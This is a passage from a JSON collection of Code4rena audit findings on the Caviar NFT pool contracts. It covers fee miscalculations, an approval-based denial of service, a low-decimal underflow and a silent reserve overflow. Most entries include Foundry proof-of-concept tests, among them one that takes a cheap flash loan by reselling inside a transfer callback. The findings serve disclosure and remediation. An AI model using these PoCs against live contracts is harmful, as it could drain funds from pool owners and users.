how fees are paid. After confirming with the Sponsor, I agree with Medium Severity.\n\n**Status:** Mitigation confirmed. Full details in reports from [rbserver](https://github.com/code-423n4/2023-05-caviar-mitigation-contest-findings/issues/31), [KrisApostolov](https://github.com/code-423n4/2023-05-caviar-mitigation-contest-findings/issues/41), and [rvierdiiev](https://github.com/code-423n4/2023-05-caviar-mitigation-contest-findings/issues/11).\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue with the PrivatePool.sol code on the 2023-04-caviar repository on Github. When a user takes a flashloan, he pays a fee to the PrivatePool, but the whole fee amount is sent to the PrivatePool, and the factory receives nothing. Other functions of the contract, such as the 'change' function, calculate pool and protocol fees, but in the case of flashloan, only the pool receives the fees. The bug was discovered using VsCode.\n\nThe recommended mitigation step to solve this issue is to send some part of the flashloan fee to the factory.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "https://github.com/code-423n4/2023-04-caviar-findings/issues/697",
      "tags": [],
      "finders": [
        "rvierdiiev"
      ]
    },
    {
      "id": "16250",
      "title": "[M-05] EthRouter.sell, EthRouter.deposit, and EthRouter.change functions can be DOSed for some ERC721 tokens",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L152-L209\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L219-L248\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L254-L293\nhttps://etherscan.io/address/0xf5b0a3efb8e8e4c201e2a935f110eaaf3ffecb8d#code#L672\n\n\n## Vulnerability details\n\n## Impact\nThe following `EthRouter.sell`, `EthRouter.deposit`, and `EthRouter.change` functions call the corresponding ERC721 tokens' `setApprovalForAll` functions.\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L152-L209\n```solidity\n    function sell(Sell[] calldata sells, uint256 minOutputAmount, uint256 deadline, bool payRoyalties) public {\n        ...\n        // loop through and execute the sells\n        for (uint256 i = 0; i < sells.length; i++) {\n            ...\n            // approve the pair to transfer NFTs from the router\n            ERC721(sells[i].nft).setApprovalForAll(sells[i].pool, true);\n            ...\n        }\n        ...\n    }\n```\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L219-L248\n```solidity\n    function deposit(\n        address payable privatePool,\n        address nft,\n        uint256[] calldata tokenIds,\n        uint256 minPrice,\n        uint256 maxPrice,\n        uint256 deadline\n    ) public payable {\n        ...\n        // approve pair to transfer NFTs from router\n        ERC721(nft).setApprovalForAll(privatePool, true);\n        ...\n    }\n```\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L254-L293\n```solidity\n    function change(Change[] calldata changes, uint256 deadline) public payable {\n        ...\n        // loop through and execute the changes\n        for (uint256 i = 0; i < changes.length; i++) {\n            Change memory _change = changes[i];\n            ...\n            // approve pair to transfer NFTs from router\n            ERC721(_change.nft).setApprovalForAll(_change.pool, true);\n            ...\n        }\n        ...\n    }\n```\n\nFor ERC721 tokens like Axie, which its `setApprovalForAll` function is shown below, calling their `setApprovalForAll` functions with the same `msg.sender`-`_operator`-`_approved` combination would revert because of requirements like `require(_tokenOperator[msg.sender][_operator] != _approved)`. For these ERC721 tokens, calling the `EthRouter.sell`, `EthRouter.deposit`, and `EthRouter.change` functions for the first time, which call such tokens' `setApprovalForAll` functions for the first time, can succeed; however, calling the `EthRouter.sell`, `EthRouter.deposit`, and `EthRouter.change` functions again, which call such tokens' `setApprovalForAll` functions with the same pool as `_operator` and `true` as `_approved` again, will revert. In this case, the `EthRouter.sell`, `EthRouter.deposit`, and `EthRouter.change` functions are DOS'ed for such ERC721 tokens.\n\nhttps://etherscan.io/address/0xf5b0a3efb8e8e4c201e2a935f110eaaf3ffecb8d#code#L672\n```solidity\n  function setApprovalForAll(address _operator, bool _approved) external whenNotPaused {\n    require(_tokenOperator[msg.sender][_operator] != _approved);\n    _tokenOperator[msg.sender][_operator] = _approved;\n    ApprovalForAll(msg.sender, _operator, _approved);\n  }\n```\n\n## Proof of Concept\nThe following steps can occur for the described scenario.\n1. Alice calls the `EthRouter.sell` function to sell 1 Axie NFT to a private pool, which succeeds.\n2. Alice calls the `EthRouter.sell` function again to sell another Axie NFT to the same private pool. However, this function call's execution of `ERC721(sells[i].nft).setApprovalForAll(sells[i].pool, true)` reverts because Axie's `require(_tokenOperator[msg.sender][_operator] != _approved)` reverts.\n3. Bob tries to repeat Step 2 but his `EthRouter.sell` function call also reverts.\n4. Hence, the `EthRouter.sell` function is DOS'ed for selling any Axie NFTs to the same private pool for any users.\n\n## Tools Used\nVSCode\n\n## Recommended Mitigation Steps\nThe `EthRouter.sell`, `EthRouter.deposit`, and `EthRouter.change` functions can be respectively updated to check if the `EthRouter` contract has approved the corresponding pool to spend any of the corresponding ERC721 tokens received by itself. If not, the corresponding ERC721's `setApprovalForAll` function can be called; otherwise, the corresponding ERC721's `setApprovalForAll` function should not be called.",
      "summary": "\nThis bug report is about a vulnerability in the EthRouter contract, which is used to manage transactions for ERC721 tokens. The vulnerability is related to the `EthRouter.sell`, `EthRouter.deposit`, and `EthRouter.change` functions, which call the corresponding ERC721 tokens' `setApprovalForAll` functions. This could cause a denial of service attack for ERC721 tokens like Axie, which have a requirement that the `setApprovalForAll` function must be called with a different `_approved` argument each time. \n\nThe vulnerability can be demonstrated by Alice calling the `EthRouter.sell` function to sell 1 Axie NFT to a private pool, which succeeds. If Alice then calls the `EthRouter.sell` function again to sell another Axie NFT to the same private pool, the execution of `ERC721(sells[i].nft).setApprovalForAll(sells[i].pool, true)` will revert because Axie's `require(_tokenOperator[msg.sender][_operator] != _approved)` reverts. This will also happen for Bob if he tries to repeat the same steps, thus the `EthRouter.sell` function is DOS'ed for selling any Axie NFTs to the same private pool for any users. \n\nThe recommended mitigation steps for this vulnerability include updating the `EthRouter.sell`, `EthRouter.deposit`, and `EthRouter.change` functions to check if the `EthRouter` contract has approved the corresponding pool to spend any of the corresponding ERC721 tokens received by itself. If not, the corresponding ERC721's `setApprovalForAll` function can be called; otherwise, the corresponding ERC721's `setApprovalForAll` function should not be called. \n\nThe tools used for this bug report include VSCode.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "https://github.com/code-423n4/2023-04-caviar-findings/issues/776",
      "tags": [],
      "finders": [
        "rbserver"
      ]
    },
    {
      "id": "16249",
      "title": "[M-04] changeFeeQuote will fail for low decimal ERC20 tokens",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L731-L738\n\n\n## Vulnerability details\n\n## Impact\n\nPrivate pools have a \"change\" fee setting that is used to charge fees when a change is executed in the pool (user swaps tokens for some tokens in the pool). This setting is controlled by the `changeFee` variable, which is intended to be defined using 4 decimals of precision:\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L87-L88\n\n```solidity\n87:     /// @notice The change/flash fee to 4 decimals of precision. For example, 0.0025 ETH = 25. 500 USDC = 5_000_000.\n88:     uint56 public changeFee;\n```\n\nAs the comment says, in the case of ETH a value of 25 should represent 0.0025 ETH. In the case of an ERC20 this should be scaled accordingly based on the number of decimals of the token. The implementation is defined in the `changeFeeQuote` function.\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L731-L738\n\n```solidity\n731:     function changeFeeQuote(uint256 inputAmount) public view returns (uint256 feeAmount, uint256 protocolFeeAmount) {\n732:         // multiply the changeFee to get the fee per NFT (4 decimals of accuracy)\n733:         uint256 exponent = baseToken == address(0) ? 18 - 4 : ERC20(baseToken).decimals() - 4;\n734:         uint256 feePerNft = changeFee * 10 ** exponent;\n735: \n736:         feeAmount = inputAmount * feePerNft / 1e18;\n737:         protocolFeeAmount = feeAmount * Factory(factory).protocolFeeRate() / 10_000;\n738:     }\n```\n\nAs we can see in the previous snippet, in case the `baseToken` is an ERC20, then the exponent is calculated as `ERC20(baseToken).decimals() - 4`. The main issue here is that if the token decimals are less than 4, then the subtraction will cause an underflow due to Solidity's default checked math, causing the whole transaction to be reverted.\n\nSuch tokens with low decimals exist, one major example is [GUSD](https://etherscan.io/token/0x056Fd409E1d7A124BD7017459dFEa2F387b6d5Cd), Gemini dollar, which has only two decimals. If any of these tokens is used as the base token of a pool, then any call to the `change` will be reverted, as the scaling of the charge fee will result in an underflow.\n\n## Proof of Concept\n\nIn the following test we recreate the \"Gemini dollar\" token (GUSD) which has 2 decimals and create a Private Pool using it as the base token. Any call to `change` or `changeFeeQuote` will be reverted due to an underflow error.\n\nNote: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/06238839330315780b90d9202042ea0f).\n\n```solidity\nfunction test_PrivatePool_changeFeeQuote_LowDecimalToken() public {\n    // Create a pool with GUSD which has 2 decimals\n    ERC20 gusd = new GUSD();\n\n    PrivatePool privatePool = new PrivatePool(\n        address(factory),\n        address(royaltyRegistry),\n        address(stolenNftOracle)\n    );\n    privatePool.initialize(\n        address(gusd), // address _baseToken,\n        address(milady), // address _nft,\n        100e18, // uint128 _virtualBaseTokenReserves,\n        10e18, // uint128 _virtualNftReserves,\n        500, // uint56 _changeFee,\n        100, // uint16 _feeRate,\n        bytes32(0), // bytes32 _merkleRoot,\n        false, // bool _useStolenNftOracle,\n        false // bool _payRoyalties\n    );\n\n    // The following will fail due an overflow. Calls to `change` function will always revert.\n    vm.expectRevert();\n    privatePool.changeFeeQuote(1e18);\n}\n```\n\n## Recommendation\n\nThe implementation of `changeFeeQuote` should check if the token decimals are less than 4 and handle this case by dividing by the exponent difference to correctly scale it (i.e. `chargeFee / (10 ** (4 - decimals))`). For example, in the case of GUSD with 2 decimals, a `chargeFee` value of `5000` should be treated as `0.50`.",
      "summary": "\nThis bug report is about an issue with the \"change\" fee setting in Private Pools. It is controlled by the `changeFee` variable, which is intended to be defined using 4 decimals of precision. However, if the token decimals are less than 4, then the subtraction will cause an underflow due to Solidity's default checked math, causing the whole transaction to be reverted. This has been demonstrated using a test which recreates the \"Gemini dollar\" token (GUSD) which has 2 decimals and creates a Private Pool using it as the base token. Any call to `change` or `changeFeeQuote` will be reverted due to an underflow error.\n\nThe recommended solution to this issue is for the implementation of `changeFeeQuote` to check if the token decimals are less than 4 and handle this case by dividing by the exponent difference to correctly scale it (i.e. `chargeFee / (10 ** (4 - decimals))`). This way, a `chargeFee` value of `5000` would be treated as `0.50` in the case of GUSD with 2 decimals.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "https://github.com/code-423n4/2023-04-caviar-findings/issues/858",
      "tags": [],
      "finders": [
        "yixxas",
        "cryptonue",
        "shaka",
        "saian",
        "giovannidisiena",
        "Kek",
        "0x5rings",
        "ayden",
        "joestakey",
        "0xWeiss",
        "T1MOH",
        "0xLanterns",
        "Brenzee",
        "aviggiano",
        "adriro",
        "0x4non",
        "Naubit",
        "ToonVH",
        "0xbepresent",
        "Koolex",
        "chaduke",
        "ElKu",
        "indijanc",
        "anodaram",
        "ck"
      ]
    },
    {
      "id": "16248",
      "title": "[M-03] Flash loan fee is incorrect in Private Pool contract",
      "impact": "MEDIUM",
      "content": "\nPrivate Pools support NFT borrowing using flash loans. Users that decide to use this feature have to pay a flash loan fee to the owner of the pool.\n\nThe contract has a `changeFee` variable that is used to configure the fee for changing NFTs, and this variable is also used to determine the fee for flash loans. In the case of a change operation, the value is interpreted as an amount with 4 decimals, and the token is the base token of the pool. This means that, for example, if the base token is ETH, a `changeFee` value of 25 should be interpreted as a fee of 0.0025 ETH for change operation.\n\nHowever, as we can see in this following snippet, the `flashFee` function just returns the value of `changeFee` without any scaling or modification.\n\n<https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L750-L752>\n\n```solidity\n750:     function flashFee(address, uint256) public view returns (uint256) {\n751:         return changeFee;\n752:     }\n```\n\nThis means that, following the previous example, a `changeFee` value of 25 will result in 0.0025 ETH for change operation, but **just 25 wei for flash loans**.\n\nThe [documentation](https://docs.caviar.sh/technical-reference/custom-pools/smart-contract-api/privatepool#changefee) hints that this value should also be scaled to 4 decimals in the case of the flash loan fee, but in any case this is clearly an incorrect setting of the flash loan fee.\n\n### Proof of Concept\n\nIn the following test, the pool is configured with a `changeFee` value of 25, and Alice is able to execute a flash loan by just paying 25 wei.\n\nNote: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/06238839330315780b90d9202042ea0f).\n\n```solidity\nfunction test_PrivatePool_flashLoan_IncorrectFee() public {\n    // Setup pool\n    PrivatePool privatePool = new PrivatePool(\n        address(factory),\n        address(royaltyRegistry),\n        address(stolenNftOracle)\n    );\n    uint56 changeFee = 25;\n    privatePool.initialize(\n        address(0), // address _baseToken,\n        address(milady), // address _nft,\n        100e18, // uint128 _virtualBaseTokenReserves,\n        10e18, // uint128 _virtualNftReserves,\n        changeFee, // uint56 _changeFee,\n        0, // uint16 _feeRate,\n        bytes32(0), // bytes32 _merkleRoot,\n        false, // bool _useStolenNftOracle,\n        false // bool _payRoyalties\n    );\n    \n    uint256 tokenId = 0;\n    milady.mint(address(privatePool), tokenId);\n    \n    // Alice executes a flash loan\n    vm.startPrank(alice);\n    \n    FlashLoanBorrower flashLoanBorrower = new FlashLoanBorrower();\n    \n    // Alice just sends 25 wei!\n    vm.deal(alice, changeFee);\n    privatePool.flashLoan{value: changeFee}(flashLoanBorrower, address(milady), tokenId, \"\");\n    \n    vm.stopPrank();\n}\n```\n\n### Recommended Mitigation Steps\n\nThe `flashFee` function should properly scale the value of the `changeFee` variable, similar to how it is implemented in `changeFeeQuote`.\n\n**[outdoteth (Caviar) confirmed and mitigated](https://github.com/code-423n4/2023-04-caviar-findings/issues/864#issuecomment-1519901128):**\n > Fixed in: https://github.com/outdoteth/caviar-private-pools/pull/6\n> \n> Proposed fix is to exponentiate the changeFee to get the correct flashFee in the same way that changeFee is exponentiated in change().\n> \n> ```solidity\n> function flashFee(address, uint256) public view returns (uint256) {\n>     // multiply the changeFee to get the fee per NFT (4 decimals of accuracy)\n>     uint256 exponent = baseToken == address(0) ? 18 - 4 : ERC20(baseToken).decimals() - 4;\n>     uint256 feePerNft = changeFee * 10 ** exponent;\n>     return feePerNft;\n> }\n> ```\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-04-caviar-findings/issues/864#issuecomment-1527242637):**\n > First of all FlashLoan Fees don't have to scale.\n> \n> That said, the code and the codebase point to wanting to offer a fee that scales based on the amounts loaned. For this nuanced reason, given that the Sponsor has confirmed and mitigated with a scaling fee, I believe that the most appropriate severity is Medium.\n\n**Status:** Mitigation confirmed. Full details in reports from [rbserver](https://github.com/code-423n4/2023-05-caviar-mitigation-contest-findings/issues/33), [KrisApostolov](https://github.com/code-423n4/2023-05-caviar-mitigation-contest-findings/issues/39), and [rvierdiiev](https://github.com/code-423n4/2023-05-caviar-mitigation-contest-findings/issues/9).\n\n\n\n***\n\n",
      "summary": "\nThe bug report concerns a vulnerability in the Private Pools smart contract. This contract allows users to borrow Non-Fungible Tokens (NFTs) using flash loans. The contract includes a `changeFee` variable to configure the fee for changing NFTs, and this variable is also used to determine the fee for flash loans. However, the `flashFee` function returns the value of `changeFee` without any scaling or modification, meaning that, for example, if the base token is ETH, a `changeFee` value of 25 should be interpreted as a fee of 0.0025 ETH for change operation, but only 25 wei for flash loans. \n\nThe bug was tested using a pool configured with a `changeFee` value of 25, and Alice was able to execute a flash loan by just paying 25 wei. The test code can be found in a full test file [here](https://gist.github.com/romeroadrian/06238839330315780b90d9202042ea0f).\n\nThe recommendation is that the `flashFee` function should properly scale the value of the `changeFee` variable, similar to how it is implemented in `changeFeeQuote`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "https://github.com/code-423n4/2023-04-caviar-findings/issues/864",
      "tags": [],
      "finders": [
        "climber2002",
        "shaka",
        "giovannidisiena",
        "minhtrng",
        "wintermute",
        "rbserver",
        "0xNorman",
        "sashik_eth",
        "jpserrat",
        "SpicyMeatball",
        "Voyvoda",
        "GT_Blockchain",
        "aviggiano",
        "adriro",
        "Josiah",
        "ToonVH",
        "RaymondFam",
        "Aymen0909",
        "0xRobocop",
        "bin2chen",
        "ElKu",
        "KrisApostolov",
        "anodaram"
      ]
    },
    {
      "id": "16247",
      "title": "[M-02] EthRouter cant perform multiple changes",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/EthRouter.sol#L273\n\n\n## Vulnerability details\n\n## Impact\nEthRouter is meant to support multiple changes in one tx, but that would fail\n\n## Proof of Concept\n\nThe function `EthRouter.change` sends `msg.value` to pool in a for loop:\n\n```js\nfor (uint256 i = 0; i < changes.length; i++) {\n    Change memory _change = changes[i];\n\n    ...\n\n    // execute change\n    PrivatePool(_change.pool).change{value: msg.value}(\n        _change.inputTokenIds,\n        _change.inputTokenWeights,\n        _change.inputProof,\n        _change.stolenNftProofs,\n        _change.outputTokenIds,\n        _change.outputTokenWeights,\n        _change.outputProof\n    );\n```\nThe pool subtracts the fee, and sends the rest back to the router. After the first iteration the router contains less ETH than `msg.value` and will revert\n\n<details>\n  <summary>POC here</summary>\n  \nAdd to `Change.t.sol` and run with `forge test --match test_twoChanges -vvvv`\n\n```js\n    function test_twoChangesOneCall() public {\n    uint256[] memory inputTokenIds = new uint256[](1);\n    uint256[] memory inputTokenWeights = new uint256[](0);\n    uint256[] memory outputTokenIds = new uint256[](1);\n    uint256[] memory outputTokenWeights = new uint256[](0);\n\n    uint256[] memory inputTokenIds2 = new uint256[](1);\n    uint256[] memory inputTokenWeights2 = new uint256[](0);\n    uint256[] memory outputTokenIds2 = new uint256[](1);\n    uint256[] memory outputTokenWeights2 = new uint256[](0);\n\n    inputTokenIds[0] = 5;\n    outputTokenIds[0] = 0;\n\n    inputTokenIds2[0] = 6;\n    outputTokenIds2[0] = 1;\n\n    EthRouter.Change[] memory changes = new EthRouter.Change[](2);\n    changes[0] = EthRouter.Change({\n        pool: payable(address(privatePool)),\n        nft: address(milady),\n        inputTokenIds: inputTokenIds,\n        inputTokenWeights: inputTokenWeights,\n        inputProof: PrivatePool.MerkleMultiProof(new bytes32[](0), new bool[](0)),\n        stolenNftProofs: new IStolenNftOracle.Message[](0),\n        outputTokenIds: outputTokenIds,\n        outputTokenWeights: outputTokenWeights,\n        outputProof: PrivatePool.MerkleMultiProof(new bytes32[](0), new bool[](0))\n    });\n\n    changes[1] = EthRouter.Change({\n        pool: payable(address(privatePool)),\n        nft: address(milady),\n        inputTokenIds: inputTokenIds2,\n        inputTokenWeights: inputTokenWeights2,\n        inputProof: PrivatePool.MerkleMultiProof(new bytes32[](0), new bool[](0)),\n        stolenNftProofs: new IStolenNftOracle.Message[](0),\n        outputTokenIds: outputTokenIds2,\n        outputTokenWeights: outputTokenWeights2,\n        outputProof: PrivatePool.MerkleMultiProof(new bytes32[](0), new bool[](0))\n    });\n\n    (uint256 changeFee,) = privatePool.changeFeeQuote(inputTokenIds.length * 1e18);\n\n    //WARDEN: multiply with 10 just to make sure there really is enough\n    ethRouter.change{value: changeFee*10}(changes, 0);\n\n} \n  ```\n  \nOutput:\n\n```\n...\n        [0] PrivatePool::change{value: 50000000000000000000}([6], [], ([], []), [], [1], [], ([], [])) \n            \"EvmError: OutOfFund\"\n         \"EvmError: Revert\"\n      \"EvmError: Revert\"\n```\n\n</details>\n\n## Tools Used\n\nManual review\n\n## Recommended Mitigation Steps\nonly send the required change fee and not `msg.value`",
      "summary": "\nThis bug report is related to the EthRouter.sol function `EthRouter.change` in the code repository https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/EthRouter.sol#L273. The function is intended to support multiple changes in one transaction, but it fails to do so. The problem is that it sends `msg.value` to the pool in a for loop, and after the first iteration, the router contains less ETH than `msg.value` and will revert. \n\nA proof of concept code is provided to demonstrate the vulnerability. It adds to `Change.t.sol` and runs with `forge test --match test_twoChanges -vvvv`. The output shows that the function reverts due to \"OutOfFund\" and \"Revert\" errors. \n\nThe vulnerability was identified using manual review. The recommended mitigation step is to only send the required change fee and not `msg.value`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "https://github.com/code-423n4/2023-04-caviar-findings/issues/873",
      "tags": [],
      "finders": [
        "BradMoon",
        "bin2chen",
        "ladboy233",
        "Ruhum",
        "Voyvoda",
        "0xRobocop",
        "Kek",
        "chaduke",
        "Rappie",
        "0x4db5362c",
        "adriro",
        "ChrisTina",
        "minhtrng",
        "ych18"
      ]
    },
    {
      "id": "16246",
      "title": "[M-01] The buy functions mechanism enables users to acquire flash loans at a cheaper fee rate.",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L211-L289\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L240\n\n\n## Vulnerability details\n\n## Impact\n\nThe buy function's mechanism allows users to access flash loans at a lower fee cost, which could affect the pool owner's yield if users opt for it instead of flash loans.\n\n## Proof of Concept\n\nThe buy function initially transfers the NFTs to the buyer before verifying and receiving payment. This mechanism creates an opportunity for users to access flash loans that are akin to flash swaps in Uniswap.\n\nIt is worth noting that this scenario is only viable in pools with ERC20 tokens since they do not necessitate upfront payment, unlike payable functions. Additionally, it requires the flash loan fee to be greater than the combined buy and sell fees for the NFTs.\n\nA proof-of-concept (PoC) demonstrating this scenario is provided below:\n\n```solidity\n// @audit-info These are the default circumstances used by most of the tests:\n\nPrivatePool public privatePool;\n\naddress baseToken = address(shibaInu);\naddress nft = address(milady);\nuint128 virtualBaseTokenReserves = 100e6;\nuint128 virtualNftReserves = 10e18;\nuint16 feeRate = 1e2;\nuint56 changeFee = 3e6;\nbytes32 merkleRoot = bytes32(0);\naddress owner = address(this);\n\nuint256[] tokenIds;\nuint256[] tokenWeights;\nPrivatePool.MerkleMultiProof proofs;\nIStolenNftOracle.Message[] stolenNftProofs;\n\nfunction setUp() public {\n    privatePool = new PrivatePool(address(factory), address(royaltyRegistry), address(stolenNftOracle));\n    privatePool.initialize(\n            baseToken, nft, virtualBaseTokenReserves, virtualNftReserves, changeFee, feeRate, merkleRoot, true, false\n    );\n    deal(address(shibaInu), address(this), 2e6);\n\n    // @audit-info Giving the pool 60 tokens to trade with\n    deal(address(shibaInu), address(privatePool), 100e6);\n\n    for (uint256 i = 0; i < 5; i++) {\n        milady.mint(address(privatePool), i + 1);\n    }\n    assertEq(milady.balanceOf(address(privatePool)), 5, \"Didn't mint 5 NFTs for some reason.\");\n}\n\nfunction test_failBecauseOfDivisionBy0() public {\n\n    for (uint256 i = 0; i < 5; i++) {\n        tokenIds.push(i + 1);\n    }\n\n    (uint netInputAmount, uint feeAmount, uint protocolFeeAmount) = privatePool.buyQuote(5e18);\n\n    shibaInu.approve(address(privatePool), netInputAmount);\n    // @audit-info Trying to buy the 5 tokens present in the pool\n    privatePool.buy(tokenIds, tokenWeights, proofs);\n}\n\nfunction onERC721Received(\n    address operator,\n    address from,\n    uint256 tokenId,\n    bytes calldata data\n) external override returns (bytes4) {\n    // @audit-info Claim airdrop for the specific NFT here\n    airdrop.claim(tokenId);\n\n    // @audit-info Selling the NFT here\n    uint[] memory _tokenIds = new uint[](1);\n    _tokenIds[0] = tokenId;\n\n    milady.approve(address(privatePool), tokenId);\n    (uint netInputAmount, uint feeAmount, uint protocolFeeAmount) = privatePool.sellQuote(1e18);\n         \n    privatePool.sell(_tokenIds, tokenWeights, proofs, stolenNftProofs);\n    return bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\"));\n}\n```\n\n## Tools Used\n\nManual review, Foundry\n\n## Recommended Mitigation Steps\n\nConsider sending the NFTs after the funds have been received by the contract.",
      "summary": "\nThis bug report is about a vulnerability in the buy function of the PrivatePool.sol code. This function allows users to access flash loans at a lower fee cost, which could affect the pool owner's yield if users opt for it instead of flash loans. \n\nThe vulnerability is created by the buy function initially transferring the NFTs to the buyer before verifying and receiving payment. This mechanism creates an opportunity for users to access flash loans that are akin to flash swaps in Uniswap. It is worth noting that this scenario is only viable in pools with ERC20 tokens since they do not necessitate upfront payment. Additionally, it requires the flash loan fee to be greater than the combined buy and sell fees for the NFTs. \n\nA proof-of-concept (PoC) demonstrating this scenario is provided in the report. It was found through manual review and Foundry, a tool used for auditing smart contracts. \n\nThe recommended mitigation step for this vulnerability is to consider sending the NFTs after the funds have been received by the contract.",
      "quality_score": 5,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "https://github.com/code-423n4/2023-04-caviar-findings/issues/885",
      "tags": [],
      "finders": [
        "KrisApostolov"
      ]
    },
    {
      "id": "16245",
      "title": "[H-03] Risk of silent overflow in reserves update",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L230-L231> \n\n<https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L323-L324>\n\n### Vulnerability details\n\nThe [`buy()`](https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L211) and [`sell()`](https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L301) functions update the `virtualBaseTokenReserves` and `virtualNftReserves` variables during each trade. However, these two variables are of type `uint128`, while the values that update them are of type `uint256`. This means that casting to a lower type is necessary, but this casting is performed without first checking that the values being cast can fit into the lower type. As a result, there is a risk of a silent overflow occurring during the casting process.\n\n```solidity\n    function buy(uint256[] calldata tokenIds, uint256[] calldata tokenWeights, MerkleMultiProof calldata proof) \n        public\n        payable\n        returns (uint256 netInputAmount, uint256 feeAmount, uint256 protocolFeeAmount)\n    {\n        // ~~~ Checks ~~~ //\n\n        // calculate the sum of weights of the NFTs to buy\n        uint256 weightSum = sumWeightsAndValidateProof(tokenIds, tokenWeights, proof);\n\n        // calculate the required net input amount and fee amount\n        (netInputAmount, feeAmount, protocolFeeAmount) = buyQuote(weightSum);\n        ...\n        // update the virtual reserves\n        virtualBaseTokenReserves += uint128(netInputAmount - feeAmount - protocolFeeAmount); \n        virtualNftReserves -= uint128(weightSum);\n        ...\n```\n\n### Impact\n\nIf the reserves variables are updated with a silent overflow, it can lead to a breakdown of the xy=k equation. This, in turn, would result in a totally incorrect price calculation, causing potential financial losses for users or pool owners.\n\n### Proof of Concept\n\nConsider the scenario with a base token that has high decimals number described in the next test (add it to the `test/PrivatePool/Buy.t.sol`):\n\n```solidity\n    function test_Overflow() public {\n        // Setting up pool and base token HDT with high decimals number - 30\n        // Initial balance of pool - 10 NFT and 100_000_000 HDT\n        HighDecimalsToken baseToken = new HighDecimalsToken();\n        privatePool = new PrivatePool(address(factory), address(royaltyRegistry), address(stolenNftOracle));\n        privatePool.initialize(\n            address(baseToken),\n            nft,\n            100_000_000 * 1e30,\n            10 * 1e18,\n            changeFee,\n            feeRate,\n            merkleRoot,\n            true,\n            false\n        );\n\n        // Minting NFT on pool address\n        for (uint256 i = 100; i < 110; i++) {\n            milady.mint(address(privatePool), i);\n        }\n        // Adding 8 NFT ids into the buying array\n        for (uint256 i = 100; i < 108; i++) {\n            tokenIds.push(i);\n        }\n        // Saving K constant (xy) value before the trade\n        uint256 kBefore = uint256(privatePool.virtualBaseTokenReserves()) * uint256(privatePool.virtualNftReserves());\n\n        // Minting enough HDT tokens and approving them for pool address\n        (uint256 netInputAmount,, uint256 protocolFeeAmount) = privatePool.buyQuote(8 * 1e18);\n        deal(address(baseToken), address(this), netInputAmount);\n        baseToken.approve(address(privatePool), netInputAmount);\n\n        privatePool.buy(tokenIds, tokenWeights, proofs);\n\n        // Saving K constant (xy) value after the trade\n        uint256 kAfter = uint256(privatePool.virtualBaseTokenReserves()) * uint256(privatePool.virtualNftReserves());\n\n        // Checking that K constant succesfully was changed due to silent overflow\n        assertEq(kBefore, kAfter, \"K constant was changed\");\n    }\n```\n\nAlso add this contract into the end of `Buy.t.sol` file for proper test work:\n\n```solidity\n    contract HighDecimalsToken is ERC20 {\n        constructor() ERC20(\"High Decimals Token\", \"HDT\", 30) {}\n    }\n```\n\n### Recommended Mitigation Steps\n\nAdd checks that the casting value is not greater than the `uint128` type max value:\n\n```solidity\nFile: PrivatePool.sol\n229:         // update the virtual reserves\n+            if (netInputAmount - feeAmount - protocolFeeAmount > type(uint128).max) revert Overflow();\n230:         virtualBaseTokenReserves += uint128(netInputAmount - feeAmount - protocolFeeAmount); \n+            if (weightSum > type(uint128).max) revert Overflow();\n231:         virtualNftReserves -= uint128(weightSum);\n\nFile: PrivatePool.sol\n322:         // update the virtual reserves\n+            if (netOutputAmount + protocolFeeAmount + feeAmount > type(uint128).max) revert Overflow();\n323:         virtualBaseTokenReserves -= uint128(netOutputAmount + protocolFeeAmount + feeAmount);\n+            if (weightSum > type(uint128).max) revert Overflow();\n324:         